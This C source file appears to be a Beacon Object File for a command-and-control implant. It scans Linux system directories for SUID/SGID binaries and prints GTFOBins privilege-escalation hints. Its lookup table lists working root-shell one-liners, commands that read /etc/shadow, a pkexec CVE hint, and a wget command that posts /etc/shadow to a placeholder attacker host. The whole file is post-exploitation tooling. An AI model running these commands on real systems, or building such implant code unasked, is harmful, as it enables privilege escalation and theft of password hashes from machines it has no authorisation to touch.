/// suid_scan.c — SUID/SGID scanner with GTFOBins hints
/// gcc -c -o suid_scan.o suid_scan.c -include bof_api.h -Os -fPIC
#include "bof_api.h"

struct linux_dirent64 {
    unsigned long long d_ino; long long d_off;
    unsigned short d_reclen; unsigned char d_type; char d_name[];
};
#define DT_DIR 4
#define DT_REG 8
#define DT_LNK 10
//#define S_ISUID 04000
//#define S_ISGID 02000

typedef struct { const char *n; const char *h; } gtfo_t;
static const gtfo_t gtfo[] = {
    {"bash","bash -p"},{"sh","sh -p"},{"dash","dash -p"},{"zsh","zsh"},
    {"env","env /bin/sh -p"},{"find","find . -exec /bin/sh -p \\;"},
    {"vim","vim -c ':!sh'"},{"vi","vi -c ':!sh'"},{"nano","nano -> ^R^X -> sh"},
    {"less","less -> !/bin/sh"},{"more","more -> !/bin/sh"},{"man","man -> !/bin/sh"},
    {"awk","awk 'BEGIN{system(\"/bin/sh\")}'"},{"perl","perl -e 'exec \"/bin/sh\"'"},
    {"python","python -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'"},
    {"python3","python3 -c 'import os;os.execl(\"/bin/sh\",\"sh\",\"-p\")'"},
    {"ruby","ruby -e 'exec \"/bin/sh\"'"},{"php","php -r 'system(\"/bin/sh\")'"},
    {"cp","cp /bin/sh /tmp/sh; chmod +s /tmp/sh"},{"dd","dd if=/etc/shadow"},
    {"tar","tar --checkpoint=1 --checkpoint-action=exec=/bin/sh"},
    {"docker","docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    {"pkexec","pkexec /bin/sh (CVE-2021-4034)"},{"sudo","sudo -l"},
    {"gdb","gdb -nx -ex '!sh' -ex quit"},{"strace","strace -o /dev/null /bin/sh -p"},
    {"wget","wget --post-file=/etc/shadow http://attacker/"},
    {"curl","curl file:///etc/shadow"},{"tee","echo | tee /etc/crontab"},
    {"nmap","nmap --interactive -> !sh"},{"chroot","chroot / /bin/sh -p"},
    {(const char*)0,(const char*)0}
};

static int g_suid, g_sgid, g_gtfo;

static const char *basename_(const char *p) {
    const char *l = p; for (const char *c = p; *c; c++) if (*c=='/') l=c+1; return l;
}

static void scan_dir(const char *dir, int depth) {
    if (depth > 8) return;
    int fd = AxOpenDir(dir); if (fd < 0) return;
    char db[8192];
    while (1) {
        int nr = AxReadDir(fd, db, sizeof(db)); if (nr<=0) break;
        int p = 0;
        while (p < nr) {
            struct linux_dirent64 *e = (struct linux_dirent64*)(db+p);
            char *n = e->d_name;
            if (n[0]=='.'&&(n[1]=='\0'||(n[1]=='.'&&n[2]=='\0'))) { p+=e->d_reclen; continue; }
            char fp[1024]; int dl=AxStrlen(dir);
            if (dl+1+AxStrlen(n)+1>1024) { p+=e->d_reclen; continue; }
            AxStrcpy(fp,dir); if(dir[dl-1]!='/'){fp[dl]='/';fp[dl+1]='\0';} AxStrcat(fp,n);

            if (e->d_type == DT_DIR) {
                if (depth==0 && (AxStrcmp(n,"proc")==0||AxStrcmp(n,"sys")==0||
                    AxStrcmp(n,"dev")==0||AxStrcmp(n,"run")==0||AxStrcmp(n,"snap")==0))
                    { p+=e->d_reclen; continue; }
                scan_dir(fp, depth+1);
            }
            if (e->d_type==DT_REG||e->d_type==DT_LNK) {
                unsigned int m=0; unsigned int uid=0;
                if (AxFileStat(fp,&m,(long*)0,&uid,(unsigned int*)0)==0) {
                    int su=(m&S_ISUID)&&(m&0111), sg=(m&S_ISGID)&&(m&0111);
                    if (su||sg) {
                        const char *bn = basename_(fp);
                        const char *hint = (const char*)0;
                        for(int i=0;gtfo[i].n;i++) if(AxStrcmp(bn,gtfo[i].n)==0){hint=gtfo[i].h;break;}
                        if (hint) {
                            BeaconPrintf(CALLBACK_OUTPUT,
                                "\xe2\x94\x82  [!!] %-44s uid=%-5d %s\n", fp, uid, hint);
                            g_gtfo++;
                        } else {
                            BeaconPrintf(CALLBACK_OUTPUT,
                                "\xe2\x94\x82       %-44s uid=%-5d %s%s\n", fp, uid,
                                su?"SUID":"", sg?(su?"+SGID":"SGID"):"");
                        }
                        if(su)g_suid++; if(sg)g_sgid++;
                    }
                }
            }
            p += e->d_reclen;
        }
    }
    AxCloseFile(fd);
}

void go(char *args, int args_len) {
    g_suid=g_sgid=g_gtfo=0;
    BeaconPrintf(CALLBACK_OUTPUT, "\n\xe2\x94\x8c\xe2\x94\x80 SUID/SGID Scanner\n");
    BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  [!!] = GTFOBins escalation candidate\n");
    const char *dirs[] = {"/usr/bin","/usr/sbin","/usr/local/bin","/usr/local/sbin",
                          "/bin","/sbin","/opt","/home","/tmp","/var",(const char*)0};
    for(int i=0;dirs[i];i++) scan_dir(dirs[i], (AxStrncmp(dirs[i],"/usr",4)==0||
        AxStrncmp(dirs[i],"/bin",4)==0||AxStrncmp(dirs[i],"/sbin",5)==0)?2:1);
    char s[80]; AxSnprintf(s,sizeof(s),"%d SUID, %d SGID, %d GTFOBins candidates",g_suid,g_sgid,g_gtfo);
    BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x94\xe2\x94\x80 %s\n\n", s);
}
